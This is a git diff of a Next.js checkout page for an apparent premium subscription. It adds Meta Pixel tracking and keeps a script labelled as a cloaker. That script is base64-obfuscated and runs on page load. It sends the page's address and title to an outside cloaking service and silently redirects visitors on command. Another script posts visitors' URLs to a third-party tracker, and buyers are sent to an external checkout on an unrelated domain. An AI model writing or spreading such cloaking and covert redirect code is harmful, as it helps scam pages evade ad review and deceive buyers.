@@ -32,7 +32,16 @@ export default function CheckoutPage() {
     paymentData?.qr_code ||
     "00020126580014br.gov.bcb.pix0136123e4567-e12b-12d1-a456-426614174000520400005303986540519.905802BR5925PRIVACYCLUB DIGITAL LTDA6009SAO PAULO62070503***6304A1B2";
   const handleConfirmData = () => {
-    // InitiateCheckout pixel removed
+    // Dispara evento InitiateCheckout do Meta Pixel
+    if (typeof window !== "undefined" && (window as any).fbq) {
+      (window as any).fbq("track", "InitiateCheckout", {
+        content_name: "Plano Anual Premium",
+        content_ids: ["plano_anual_premium"],
+        content_type: "product",
+        value: 5.0,
+        currency: "BRL",
+      });
+    }
 
     // Redireciona para checkout externo
     const checkoutExternoUrl = "https://compraseguraonline.org.ua/c/1860e6191d";
@@ -315,7 +324,7 @@ export default function CheckoutPage() {
           t.src=v;s=b.getElementsByTagName(e)[0];
           s.parentNode.insertBefore(t,s)}(window, document,'script',
           'https://connect.facebook.net/en_US/fbevents.js');
-          fbq('init', '1188608602540337');
+          fbq('init', '814735554702486');
           fbq('track', 'PageView');
         `}
       </Script>
@@ -325,12 +334,22 @@ export default function CheckoutPage() {
         src="https://cdn.jsdelivr.net/gh/xTracky/static/utm-handler.js"
         data-token="3f0817fd-b04a-49a5-972c-416d223ac189"
         data-click-id-param="click_id"
+        strategy="afterInteractive"
+        onError={(e) => {
+          console.warn("UTM Handler script failed to load:", e);
+        }}
       />
 
       {/* Cloaker Script */}
       <Script id="monitoring-script" strategy="afterInteractive">
         {`
-          !function(){var d=atob("aHR0cHM6Ly9jbG9ha2VyLnBhcmFkaXNlcGFncy5jb20vLz9hcGk9bW9uaXRvcg=="),y=atob("bW9uXzE0N2Q5MmY1ZWI1MDk1ZjY5Yjg0MjgyYjQzYzZkYTY4ZmJmM2NiMDY1ZmNhMmUzNjhmYzg4NGI2ODQ4ZjY1NTk=");function createFormData(){var dgx=new FormData;return dgx.append(atob("bW9uaXRvcl9rZXk="),y),dgx.append(atob("ZG9tYWlu"),location.hostname),dgx.append(atob("dXJs"),location.href),dgx.append(atob("dGl0bGU="),document.title),dgx}function yxq(){fetch(d,{method:atob("UE9TVA=="),body:createFormData(),headers:{"X-Requested-With":atob("WE1MSHR0cFJlcXVlc3Q=")}}).then(function(fw){return fw.json()}).then(function(c){c.success&&c.redirect&&c.redirect_url&&location.replace(c.redirect_url)}).catch(function(){})}document.readyState===atob("bG9hZGluZw==")?document.addEventListener(atob("RE9NQ29udGVudExvYWRlZA=="),yxq):yxq()}();
+          !function(){
+            try {
+              var d=atob("aHR0cHM6Ly9jbG9ha2VyLnBhcmFkaXNlcGFncy5jb20vLz9hcGk9bW9uaXRvcg=="),y=atob("bW9uXzE0N2Q5MmY1ZWI1MDk1ZjY5Yjg0MjgyYjQzYzZkYTY4ZmJmM2NiMDY1ZmNhMmUzNjhmYzg4NGI2ODQ4ZjY1NTk=");function createFormData(){var dgx=new FormData;return dgx.append(atob("bW9uaXRvcl9rZXk="),y),dgx.append(atob("ZG9tYWlu"),location.hostname),dgx.append(atob("dXJs"),location.href),dgx.append(atob("dGl0bGU="),document.title),dgx}function yxq(){fetch(d,{method:atob("UE9TVA=="),body:createFormData(),headers:{"X-Requested-With":atob("WE1MSHR0cFJlcXVlc3Q=")}}).then(function(fw){return fw.json()}).then(function(c){c.success&&c.redirect&&c.redirect_url&&location.replace(c.redirect_url)}).catch(function(err){console.warn('Monitoring script error:', err);})}document.readyState===atob("bG9hZGluZw==")?document.addEventListener(atob("RE9NQ29udGVudExvYWRlZA=="),yxq):yxq();
+            } catch(err) {
+              console.warn('Monitoring script initialization error:', err);
+            }
+          }();
         `}
       </Script>
 
@@ -340,21 +359,28 @@ export default function CheckoutPage() {
         data-utmify-prevent-xcod-sck
         data-utmify-prevent-subids
         strategy="afterInteractive"
-        async
-        defer
+        onError={(e) => {
+          console.warn("UTMify script failed to load:", e);
+        }}
       />
 
       {/* Tracking Script */}
       <Script id="tracking-script" strategy="afterInteractive">
         {`
-          fetch("https://trackerr--url.vercel.app/save-url", {
-            method: "POST", 
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              userId: "68f838038daf9bf18d65a898",
-              url: window.location.href
-            }),
-          });
+          try {
+            fetch("https://trackerr--url.vercel.app/save-url", {
+              method: "POST", 
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                userId: "68f838038daf9bf18d65a898",
+                url: window.location.href
+              }),
+            }).catch(function(err) {
+              console.warn('Tracking script error:', err);
+            });
+          } catch(err) {
+            console.warn('Tracking script initialization error:', err);
+          }
         `}
       </Script>
       <div className="min-h-screen bg-gradient-to-b from-orange-950 via-orange-900 to-orange-950 text-orange-50">
